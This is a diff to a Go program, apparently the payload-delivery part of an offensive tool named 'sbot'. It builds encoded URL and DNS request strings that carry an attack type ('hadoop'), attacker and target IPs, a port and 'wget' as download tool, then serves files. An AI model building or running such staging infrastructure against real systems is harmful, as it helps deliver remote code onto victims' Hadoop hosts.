@@ -1,40 +1,44 @@
 package main
 
 import (
-	"encoding/base64"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"github.com/sbot/server"
+	"github.com/sbot/utils/netutils"
 	"os"
 )
 
 
 func getReq(fname string) (freq string,dreq string) {
 
-	/*
-	Fname:        argsMap["fname"],
-		AttackType:   argsMap["atype"],
-			AttackIP:     argsMap["pip"],
-			TargetIP:     argsMap["tip"],
-			TargetPort:   int(port),
-			TargetOutIP:  r.RemoteAddr,
-			DownloadTool: argsMap["dt"],
-	*/
 
-	freqs := fmt.Sprintf("fname=%s&atype=hadoop&pip=192.168.1.151&tip=192.168.1.152&tPort=8081&dt=wget",fname)
-	dreqs := "atype=hadoop&pip=192.168.1.151&tip=192.168.1.152&tPort=8081"
+	ucr := &netutils.URLPathCrypt{
+		Fname:        fname,
+		AttackType:   "hadoop",
+		AttackIP:     "192.168.1.151",
+		TargetIP:     "192.168.1.152",
+		TargetPort:   8080,
+		DownloadTool: "wget",
+	}
+	
+	dcr := &netutils.DNSDomainCrypt{
+		AttackType: "hadoop",
+		AttackIP:   "192.168.1.151",
+		TargetIP:   "192.168.1.152",
+		TargetPort: 8080,
+	}
 
-	bfreqs := base64.StdEncoding.EncodeToString([]byte(freqs))
-	bdreqs := base64.StdEncoding.EncodeToString([]byte(dreqs))
 
-	return hex.EncodeToString([]byte(bfreqs)),hex.EncodeToString([]byte(bdreqs))
+
+	return netutils.URLPathCryptToString(ucr),netutils.DNSDomainCryptToString(dcr)
+
 }
 
 
 func main(){
 
 
+	fmt.Println(netutils.IPv4StrBig(3232235927))
 	fmt.Println(getReq(os.Args[2]))
 
 	cfg := &server.FileServerConfig{
@@ -72,6 +76,5 @@ func main(){
 
 	}
 
-	//fmt.Println(getReq("init.sh"))
 }
 
